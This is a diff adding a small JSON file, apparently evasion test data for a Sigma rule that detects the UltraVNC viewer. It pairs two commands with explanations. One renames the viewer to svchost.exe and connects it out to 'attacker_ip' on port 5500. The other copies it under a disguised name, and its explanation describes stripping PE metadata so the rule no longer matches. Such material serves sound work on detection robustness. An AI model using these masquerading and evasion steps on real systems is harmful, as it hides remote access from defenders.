@@ -1,0 +1,10 @@
+[
+  {
+    "output": "move vncviewer.exe svchost.exe && ./svchost.exe -connect attacker_ip::5500",
+    "explanation": "The Sigma rule relies on static PE metadata (Description, Product, Company, and OriginalFileName) which are embedded in the binary's resources. However, many SIEM environments and EDRs primarily log the 'Image' (file name) or 'Command Line'. By renaming the executable to a common system process name like 'svchost.exe', a security analyst might overlook it. More importantly, if the detection engine only inspects the file name and path rather than deep-parsing the PE header for 'OriginalFileName', renaming the file completely bypasses the rule's specific selection criteria."
+  },
+  {
+    "output": "copy C:\\Path\\To\\VNCViewer.exe %TEMP%\\not_vnc.exe",
+    "explanation": "The rule is strictly tied to the 'selection' criteria of VNC-specific metadata. An attacker can use a hex editor or resource hacking tool to strip or modify the 'Product', 'Company', and 'Description' fields in the Version Info resource of the UltraVNC binary. Once these strings are removed or changed to generic values (e.g., 'System Utility'), the process creation event will no longer match the Sigma rule's specific filters."
+  }
+]
